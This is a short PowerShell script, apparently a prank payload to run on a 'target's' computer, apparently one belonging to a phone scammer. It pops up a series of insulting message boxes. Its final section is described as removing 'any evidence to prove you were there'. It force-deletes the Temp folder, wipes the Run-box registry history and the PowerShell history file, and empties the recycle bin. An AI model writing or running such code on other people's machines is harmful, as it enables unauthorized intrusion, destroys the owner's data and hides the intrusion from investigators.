.DESCRIPTION 
    This program is to taunt your target. Below are a series insults you can modify as you like. The program will generate a PopUp 
    for each one of them. 
#>

#------------------------------------------------------------------------------------------------------------------------------------

Add-Type -AssemblyName System.Windows.Forms

# The number of times you want it to cycle through your list of questions

$cycles = 1

# List as many questions here as you like, it will cycke through all of them

$msgs = @(
"Are all scammers as dumb as you?"
"Is the pay worth being this big of a loser?"
"Do your parents know what you do for a living?"
"Does you boss know much much you suck at this job?"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "RonX_moment.exe" , 4 , 'Question')
}
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
    This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
